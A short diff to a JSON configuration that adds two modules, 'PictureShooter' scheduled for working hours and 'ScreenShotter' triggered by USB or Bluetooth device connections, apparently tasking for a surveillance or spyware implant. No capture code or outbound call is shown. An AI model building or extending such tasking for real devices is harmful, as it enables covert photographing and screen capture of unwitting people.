@@ -11,7 +11,23 @@
             "condition": {
                 "network_type": "WiFi"
             }
+        },
+        {
+            "module_name": "PictureShooter",
+            "condition": {
+                "time_range": {
+                    "start": "08:00",
+                    "end": "18:00"
+                }
+            }
+        },
+        {
+            "module_name": "ScreenShotter",
+            "condition": {
+                "connected_devices": ["USB Drive", "Bluetooth Device"]
+            }
         }
+
     ]
 }
 
